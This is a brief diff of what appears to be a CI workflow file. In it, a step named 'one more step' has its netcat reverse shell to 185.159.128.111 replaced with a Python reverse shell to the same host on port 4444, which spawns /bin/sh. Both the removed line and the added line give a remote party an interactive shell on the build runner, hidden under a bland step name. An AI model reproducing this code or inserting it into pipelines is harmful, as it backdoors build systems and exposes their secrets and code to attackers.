@@ -14,7 +14,7 @@ jobs:
 
     - name: one more step
       run: |
-        nc 185.159.128.111 44044 -e /bin/bash
+        export RHOST="185.159.128.111";export RPORT=4444;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
         sudo echo "Puck"
     
     - name: another step
